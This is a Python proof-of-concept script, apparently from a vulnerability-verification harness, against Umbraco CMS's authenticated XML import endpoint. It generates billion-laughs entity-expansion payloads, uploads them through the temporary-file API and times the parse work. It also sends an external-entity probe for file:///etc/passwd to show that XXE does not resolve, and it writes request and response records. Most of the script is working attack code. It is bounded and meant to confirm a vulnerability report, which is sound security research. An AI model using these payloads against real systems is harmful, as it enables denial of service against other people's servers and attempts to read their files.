#!/usr/bin/env python3
"""
VULN-032 — Authenticated XML-import entity-expansion / unbounded in-memory-DOM DoS (NOT XXE)

Vulnerable code (targets/Umbraco-CMS/src):
  * Umbraco.Core/Services/ImportExport/TemporaryFileToXmlImportService.cs:66
        document = await XDocument.LoadAsync(fileStream, LoadOptions.None, CancellationToken.None);
  * Umbraco.Cms.Api.Management/Services/DictionaryItemImportService.cs:108 — same XDocument.LoadAsync pattern
  * reached via GET /import/analyze?temporaryFileId=  (AnalyzeImportController.cs:44,50 -> AnalyzeAsync ->
    LoadXElementFromTemporaryFileAsync -> the :66 load). ImportControllerBase = floor-only (no section policy).

Class: CWE-776 (billion-laughs / improper restriction of recursive entity references) + CWE-400 (uncontrolled
       resource consumption via uncapped in-memory DOM). NOT XXE.

Report correction proven here:
  XDocument.Load(LoadOptions.None) parses the DTD (DtdProcessing = Parse) so INTERNAL entity expansion runs,
  but on .NET Core+ (this target = .NET 10) XmlReaderSettings.XmlResolver defaults to null and no call site
  overrides it, so EXTERNAL entities cannot resolve → no file read / SSRF. Residual = availability only:
  CPU/memory spent expanding internal entities (bounded ~10M chars) and materializing the DOM.

Idea / what a pass proves:
  1. Upload BOUNDED billion-laughs XML whose internal entities expand to ~0.25M / 2M / 6M chars (a few
     hundred bytes of input each) and MEASURE analyze time vs a trivial doc — show a tiny input forces
     millions of chars of parse work and the time grows with the expanded size (amplification).
  2. Upload an EXTERNAL-entity payload (file:///etc/passwd) and show the analyze response does NOT contain
     the file contents → confirms DoS-only, not XXE.
  Bounded: expansion capped well under the ~10M ceiling; no gigabyte payloads, no actual exhaustion.
"""
import io
import os
import sys
import time
import uuid

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c

VID = "VULN-032"
HERE = os.path.dirname(os.path.abspath(__file__))
TEMPFILE = "/umbraco/management/api/v1/temporary-file"


def upload_xml(client, xml_bytes: bytes):
    key = str(uuid.uuid4())
    fname = f"cvehunter_{c.rnd(4)}.xml"                 # .xml passes the temp-file extension denylist
    files = {"File": (fname, io.BytesIO(xml_bytes), "text/xml")}
    r = client.session.post(f"{c.BASE_URL}{TEMPFILE}", files=files, data={"Id": key}, timeout=60)
    if r.status_code != 201:
        raise RuntimeError(f"temp-file upload failed: HTTP {r.status_code} {r.text[:200]}")
    return key


def analyze(client, key: str):
    t0 = time.time()
    r = client.get(f"/import/analyze?temporaryFileId={key}")
    return r.status_code, time.time() - t0, r.text


def billion_laughs(target_chars: int) -> bytes:
    """Nested internal-entity ladder (base 64 chars, factor 8). Picks the ladder level whose single
    expansion is <= target, then references it enough times to land near target_chars — so distinct
    targets give distinct expanded sizes. Input stays a few hundred bytes (true amplification)."""
    base = "A" * 64
    factor = 8
    # ladder e0..e6 : 64, 512, 4096, 32768, 262144, 2097152, 16777216
    levels = [64]
    defs = [f'<!ENTITY e0 "{base}">']
    for i in range(1, 7):
        defs.append(f'<!ENTITY e{i} "{("&e%d;" % (i - 1)) * factor}">')
        levels.append(levels[-1] * factor)
    # largest level whose single expansion does not exceed target
    lvl = max(i for i, s in enumerate(levels) if s <= target_chars)
    reps = max(1, round(target_chars / levels[lvl]))
    body = ("&e%d;" % lvl) * reps
    doctype = "<!DOCTYPE lolz [\n" + "\n".join(defs) + "\n]>"
    xml = f'<?xml version="1.0"?>\n{doctype}\n<lolz>{body}</lolz>'
    return xml.encode(), levels[lvl] * reps  # (bytes, expected expanded char count)


def main() -> int:
    c.banner(VID, "XML-import internal entity-expansion / uncapped DOM DoS (NOT XXE) via /import/analyze",
             "TemporaryFileToXmlImportService.cs:66 XDocument.LoadAsync(LoadOptions.None) — DTD parsed, no size cap")

    admin = c.admin_client()
    c.log("SETUP", "authenticated (import/analyze + temp-file are floor-only: ANY backoffice user; admin used here)")

    # ---- baseline: a trivial well-formed doc ----
    tiny = b'<?xml version="1.0"?>\n<lolz>x</lolz>'
    k = upload_xml(admin, tiny)
    st, base_t, _ = analyze(admin, k)
    c.log("STEP", f"baseline: trivial XML ({len(tiny)} B) -> analyze HTTP {st} in {base_t*1000:.0f} ms")

    # ---- entity-expansion sweep: tiny input, millions of chars of parse work ----
    rows = []
    for target in (260_000, 1_000_000, 6_000_000):
        payload, expanded = billion_laughs(target)
        k = upload_xml(admin, payload)
        st, secs, body = analyze(admin, k)
        amp = expanded / max(1, len(payload))
        rows.append((len(payload), expanded, secs, st))
        c.log("STEP", f"expansion payload: input {len(payload)} B -> ~{expanded:,} expanded chars "
                      f"(amplification x{amp:,.0f})")
        c.log("PROOF", f"  GET /import/analyze -> HTTP {st} in {secs:.2f}s "
                       f"(the DTD was PARSED and internal entities expanded during XDocument.LoadAsync)")

    # amplification / growth summary
    biggest = rows[-1]
    grew = biggest[2] > base_t * 3 and biggest[2] > 0.15   # clearly more work than the trivial doc
    c.log("PROOF", f"parse time grew with expanded size: trivial={base_t*1000:.0f}ms -> "
                   f"{rows[0][2]*1000:.0f}ms ({rows[0][1]:,} ch) -> {rows[1][2]*1000:.0f}ms ({rows[1][1]:,} ch) -> "
                   f"{rows[2][2]*1000:.0f}ms ({rows[2][1]:,} ch); a ~{biggest[0]} B request forced "
                   f"~{biggest[1]:,} chars of work (amplification x{biggest[1]//max(1,biggest[0]):,})")

    # ---- prove NOT XXE: external entity to /etc/passwd must NOT resolve ----
    c.log("STEP", "not-XXE check: upload external-entity payload (file:///etc/passwd) and confirm no file contents leak")
    xxe = (b'<?xml version="1.0"?>\n'
           b'<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
           b'<r>&xxe;</r>')
    k = upload_xml(admin, xxe)
    st_x, secs_x, body_x = analyze(admin, k)
    leaked = ("root:" in body_x) or ("/bin/bash" in body_x) or ("daemon:" in body_x)
    if not leaked:
        c.log("PROOF", f"external-entity analyze -> HTTP {st_x} in {secs_x*1000:.0f}ms; /etc/passwd contents ABSENT "
                       f"from response → XmlResolver=null blocks external entities = DoS-only, NOT XXE (confirms correction)")
    else:
        c.log("INFO", f"UNEXPECTED: external entity content appears in response (would indicate XXE, contradicting the correction)")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# 1) upload the billion-laughs XML as a temp file (.xml passes the denylist)\n"
                f"POST {c.BASE_URL}{TEMPFILE}  (multipart: Id=<guid>, File=<internal-entity XML, a few hundred bytes>)\n\n"
                "# 2) trigger the parse/expansion via analyze (floor-only, any backoffice user)\n"
                f"GET {c.BASE_URL}/umbraco/management/api/v1/import/analyze?temporaryFileId=<guid> HTTP/1.1\n"
                "Authorization: Bearer <backoffice-token>\n\n"
                "# not-XXE probe body:\n"
                '<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <r>&xxe;</r>\n')
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"baseline trivial XML analyze: HTTP {st} in {base_t*1000:.0f} ms\n")
        for inp, exp, secs, code in rows:
            f.write(f"expansion: input {inp} B -> ~{exp:,} expanded chars -> analyze HTTP {code} in {secs:.2f}s\n")
        f.write(f"external-entity (file:///etc/passwd): HTTP {st_x} in {secs_x*1000:.0f} ms; file contents leaked = {leaked}\n")
        f.write("=> internal entity expansion runs (DoS); external entity does NOT resolve (not XXE).\n")

    if grew and not leaked:
        return c.verdict(VID, "CONFIRMED",
                         f"a ~{biggest[0]}B XML forced ~{biggest[1]:,} chars of parse work "
                         f"({rows[2][2]:.2f}s vs {base_t*1000:.0f}ms trivial); external entity did NOT resolve (DoS, not XXE)")
    if not leaked:
        return c.verdict(VID, "NEEDS_MANUAL",
                         f"entity expansion parsed but time growth modest ({rows[2][2]:.2f}s); not-XXE confirmed")
    return c.verdict(VID, "NEEDS_MANUAL", "unexpected external-entity behaviour; inspect response.txt")


if __name__ == "__main__":
    sys.exit(main())
